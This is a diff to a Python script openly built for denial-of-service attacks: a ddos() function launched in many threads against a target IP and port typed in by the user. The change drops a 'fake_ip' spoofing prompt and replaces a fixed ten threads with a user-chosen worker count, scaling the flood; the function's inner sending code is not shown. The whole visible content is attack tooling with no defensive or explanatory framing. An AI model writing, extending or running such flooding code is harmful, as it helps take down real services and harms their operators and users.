@@ -2,9 +2,9 @@ import socket
 import random
 import threading
 
-fake_ip = str(input("Fake IP = "))
 target_ip = str(input("Target IP = "))
 target_port = int(input("Target Port = "))
+max_workers = int(input("Max Workers = "))
 
 def ddos():
     try:
@@ -21,6 +21,6 @@ def ddos():
     except Exception as e:
         print("[!] DDoS an error occurred:", str(e))
 
-for i in range(10):
+for i in range(max_workers):
     thread = threading.Thread(target=ddos)
     thread.start()
